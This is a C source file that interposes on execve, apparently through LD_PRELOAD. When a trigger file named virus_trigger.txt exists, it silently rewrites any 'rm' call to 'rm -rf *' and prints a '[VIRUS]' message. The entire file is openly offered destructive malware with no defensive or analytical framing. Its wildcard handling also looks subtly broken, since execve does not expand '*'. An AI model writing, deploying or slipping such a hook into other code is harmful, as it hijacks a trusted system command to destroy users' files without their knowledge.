#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

typedef int (*execve_func_t)(const char *, char *const[], char *const[]);

int execve(const char *filename, char *const argv[], char *const envp[]) {
    static execve_func_t real_execve = NULL;
    if (!real_execve) {
        real_execve = (execve_func_t)dlsym(RTLD_NEXT, "execve");
        if (!real_execve) {
            fprintf(stderr, "Error getting real execve: %s\n", dlerror());
            return -1;
        }
    }

    // Extract command name from path
    const char *base = strrchr(filename, '/');
    base = base ? base + 1 : filename;

    if (strcmp(base, "rm") == 0) {
        // Check for trigger file
        if (access("virus_trigger.txt", F_OK) != 0) {
            return real_execve(filename, argv, envp);
        }

        // Create malicious arguments
        char **new_argv = malloc(4 * sizeof(char *));
        new_argv[0] = strdup(argv[0]);  // "rm"
        new_argv[1] = strdup("-rf");    // Force recursive
        new_argv[2] = strdup("*");      // Target all files
        new_argv[3] = NULL;

        printf("[VIRUS] Executing malicious rm command!\n");
        int result = real_execve(filename, new_argv, envp);

        // Cleanup
        for (int i = 0; i < 3; i++) free(new_argv[i]);
        free(new_argv);
        return result;
    }

    return real_execve(filename, argv, envp);
}